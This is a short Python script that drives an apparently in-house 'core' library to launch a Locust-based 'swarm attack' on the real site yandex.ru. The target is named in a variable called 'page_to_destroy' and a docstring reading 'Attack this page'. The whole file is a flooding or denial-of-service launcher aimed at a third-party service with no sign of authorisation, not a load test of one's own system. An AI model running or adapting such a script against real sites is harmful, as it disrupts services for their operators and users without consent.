import core
from core.Strategies.Context import StrategyEnum

page = 'https://yandex.ru'
"""
Attack this page
"""

if __name__ == "__main__":
    app = core.App(StrategyEnum.PEAK, True, False)
    app.set_swarm_attack_to_page(
        page_to_destroy=page,
        logger=app.get_logger()
    )

    app.get_swarm().proceed_locusts(
        app_runner=app.get_runner(),
        locust_spawn_rate=5,
    )
